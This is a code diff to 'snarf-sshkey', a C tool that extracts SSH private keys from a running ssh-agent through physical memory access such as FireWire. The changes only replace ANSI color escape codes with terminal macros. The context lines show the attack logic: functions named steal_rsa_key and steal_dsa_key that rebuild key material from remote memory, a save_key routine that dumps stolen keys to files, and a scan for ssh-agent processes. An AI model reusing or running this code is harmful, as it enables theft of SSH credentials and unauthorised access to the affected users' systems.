@@ -1,5 +1,5 @@
 /*  $Id$
- * vim: fdm=marker
+ *  vim: fdm=marker
  *
  *  snarf-sshkey : snarf ssh private keys from ssh-agent via
  *                 physical memory access (e.g. firewire)
@@ -48,6 +48,7 @@
 #include <endian_swap.h>
 
 #include "ssh-authfile.h"
+#include "term.h"
 
 char pagedir[4096];
 addr_t stack_bottom = 0;
@@ -366,7 +367,7 @@ int steal_rsa_key(linear_handle lin, Key* key)
 		printf("\t\t\t(info) n is %d bits long.\n",BN_num_bits(key->rsa->n));
 
 
-		printf("\t\t\t" "\x1b[1;32m" "OK." "\x1b[0m" "\n");
+		printf("\t\t\t" TERM_GREEN "OK." TERM_RESET "\n");
 
 		BN_CTX_free(ctx);
 
@@ -386,7 +387,7 @@ int steal_rsa_key(linear_handle lin, Key* key)
 
 	free(key->rsa);
 	key->rsa = NULL;
-	printf("\t\t\t" "\x1b[1;31m" "failed to recover bignums." "\x1b[0m" "\n");
+	printf("\t\t\t" TERM_RED "failed to recover bignums." TERM_RESET "\n");
 	return 0;
 }}}
 
@@ -509,7 +510,7 @@ int steal_dsa_key(linear_handle lin, Key* key)
 		// show length of priv_key as info
 		printf("\t\t\t(info) priv_key is %d bits long\n", BN_num_bits(key->dsa->priv_key));
 
-		printf("\t\t\t" "\x1b[1;32m" "OK." "\x1b[0m" "\n");
+		printf("\t\t\t" TERM_GREEN "OK." TERM_RESET "\n");
 
 		BN_CTX_free(ctx);
 
@@ -529,7 +530,7 @@ int steal_dsa_key(linear_handle lin, Key* key)
 
 	free(key->dsa);
 	key->dsa = NULL;
-	printf("\t\t\t" "\x1b[1;31m" "failed to recover bignums." "\x1b[0m" "\n");
+	printf("\t\t\t" TERM_RED "failed to recover bignums." TERM_RESET "\n");
 	return 0;
 }}}
 
@@ -580,7 +581,7 @@ void save_key(linear_handle lin, char* key_comment, Key* key)
 	sprintf(filename, "key %016llx %s %s", guid, username, comment);
 
 	// dump the key
-	printf("\t\t" "\x1b[1;32m" "dumping key \"%s\" to file \"%s\"" "\x1b[0m" "\n", comment_field, filename);
+	printf("\t\t" TERM_CYAN "dumping key \"%s\" to file \"%s\"" TERM_RESET "\n", comment_field, filename);
 	key_save_private(key, filename, "", comment_field);
 
 	free(comment_field);
@@ -605,7 +606,7 @@ void check_ssh_agent(linear_handle lin)
 #	define REMOTE_TO_LOCAL(r,lbase)	((char*) (lbase + ((uint32_t)r) - (AGENT_START << 12)) )
 #	define LOCAL_TO_REMOTE(l,lbase)	((char*) (l - lbase + (AGENT_START << 12)) )
 
-	printf("\x1b[5;41m" "hit:" "\x1b[0m" " ");
+	printf( TERM(TERM_A_BLINK,TERM_C_BG_RED) "hit:" TERM_RESET " ");
 	char identity_path[1024];
 	char* heap;	// actually this is a dump of the executable and heap
 			// but we don't care for the executable.
@@ -707,14 +708,14 @@ void check_ssh_agent(linear_handle lin)
 
 	 	// check all keytypes and steal existing
 		if(key.rsa) {
-			printf("\t\t" "\x1b[1;33m" "trying to steal RSA key at remote 0x%08x" "\x1b[0m" "\n", (uint32_t)key.rsa);
+			printf("\t\t" TERM_CYAN "trying to steal RSA key at remote 0x%08x" TERM_RESET "\n", (uint32_t)key.rsa);
 			if(!steal_rsa_key(lin, &key)) {
 				printf("\t\tfailed :(\n");
 				key.rsa = 0;
 			}
 		}
 		if(key.dsa) {
-			printf("\t\t" "\x1b[1;33m" "trying to steal DSA key at remote 0x%08x" "\x1b[0m" "\n", (uint32_t)key.dsa);
+			printf("\t\t" TERM_CYAN "trying to steal DSA key at remote 0x%08x" TERM_RESET "\n", (uint32_t)key.dsa);
 			if(!steal_dsa_key(lin, &key)) {
 				printf("\t\tfailed :(\n");
 				key.dsa = 0;
@@ -807,10 +808,10 @@ int main(int argc, char**argv)
 				// get process name
 				pname = get_process_name(lin);
 				if(!pname) {
-					printf("\x1b[1;31m" "K" "\x1b[0m");
+					printf(TERM(TERM_A_NORMAL,TERM_C_FG_RED) "K" TERM_RESET);
 					continue;
 				}
-				printf("U" "\x1b[1;34m" "<%s>" "\x1b[0m", pname);
+				printf("U" TERM(TERM_A_NORMAL,TERM_C_FG_BLUE) "<%s>" TERM_RESET, pname);
 
 				// check for ssh-agent
 				if((!strcmp(pname, "ssh-agent") || !strcmp(pname, "/usr/bin/ssh-agent")))
